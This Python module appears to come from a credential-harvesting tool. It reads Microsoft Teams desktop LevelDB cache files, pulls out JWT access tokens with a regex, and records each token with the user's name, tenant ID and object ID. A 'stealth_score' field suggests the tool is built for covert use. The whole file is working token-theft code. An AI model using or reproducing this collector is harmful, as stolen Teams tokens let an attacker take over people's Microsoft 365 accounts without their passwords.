"""Microsoft Teams desktop token collector — reads Teams LevelDB cache."""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import teams_data_dir


@CollectorRegistry.register
class TeamsDesktopCollector(BaseCollector):
    service = "microsoft"
    source = "teams_desktop"
    stealth_score = 5

    def _find_storage_dirs(self) -> List[Path]:
        """Find Teams Local Storage directories."""
        dirs = []
        base = teams_data_dir()

        # Classic Teams
        ls_dir = base / "Local Storage" / "leveldb"
        if ls_dir.exists():
            dirs.append(ls_dir)

        # New Teams (Teams 2.0)
        for variant in ["MSTeams", "Microsoft Teams"]:
            new_dir = base.parent / variant / "Local Storage" / "leveldb"
            if new_dir.exists():
                dirs.append(new_dir)

        return dirs

    def discover(self) -> List[DiscoveredToken]:
        results = []
        for ls_dir in self._find_storage_dirs():
            # Check log files for token patterns
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    if "accessToken" in text or "skypeToken" in text:
                        results.append(DiscoveredToken(
                            service=self.service,
                            source=self.source,
                            path=str(ls_dir),
                            stealth_score=self.stealth_score,
                            details="Teams desktop token cache found",
                        ))
                        break
                except Exception:
                    continue

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        for ls_dir in self._find_storage_dirs():
            for log_file in ls_dir.glob("*.log"):
                try:
                    raw = log_file.read_bytes()
                    text = raw.decode("utf-8", errors="replace")

                    # Look for JWT-like tokens in log files
                    for match in re.finditer(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', text):
                        token_val = match.group(0)
                        # Decode JWT to check if it's a Microsoft token
                        from ...core.validator import decode_jwt_payload
                        payload = decode_jwt_payload(token_val)
                        if payload and ("tid" in payload or "aud" in payload):
                            results.append(CollectedToken(
                                service=self.service,
                                source=self.source,
                                stealth_score=self.stealth_score,
                                username=payload.get("upn") or payload.get("preferred_username"),
                                tenant_id=payload.get("tid"),
                                access_token=secure(token_val),
                                scopes=[payload.get("aud", "")] if payload.get("aud") else None,
                                extra={
                                    "app_id": payload.get("appid"),
                                    "oid": payload.get("oid"),
                                    "source_file": str(log_file),
                                },
                            ))
                except Exception:
                    continue

        return results
